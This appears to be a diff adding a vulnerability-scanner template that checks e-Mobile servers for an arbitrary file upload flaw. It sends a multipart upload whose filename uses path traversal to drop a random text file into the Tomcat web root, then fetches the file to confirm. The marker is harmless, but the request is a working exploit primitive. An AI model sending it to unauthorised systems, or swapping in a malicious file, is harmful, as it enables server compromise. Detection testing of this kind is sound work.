@@ -1,0 +1,41 @@
+id: e-Mobile_Upload
+info:
+  name: e-Mobile 任意文件上传漏洞
+  author: 公众号网络安全透视镜
+  severity: high
+  description:
+    e-Mobile 平台存在一个任意文件上传漏洞，攻击者可利用此漏洞在服务器上上传恶意文件。
+  tags: [e-Mobile, 文件上传, 高危]
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+
+requests:
+  - raw:
+      - |-
+        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Connection: close
+        Content-Length: 197
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+        Accept-Encoding: gzip, deflate, br
+
+        ------WebKitFormBoundarymVk33liI64J7GQaK
+        Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/{{file_name}}"
+
+        {{file_content}}
+        ------WebKitFormBoundarymVk33liI64J7GQaK--
+      - |+
+        GET /{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "{{file_content}}")'
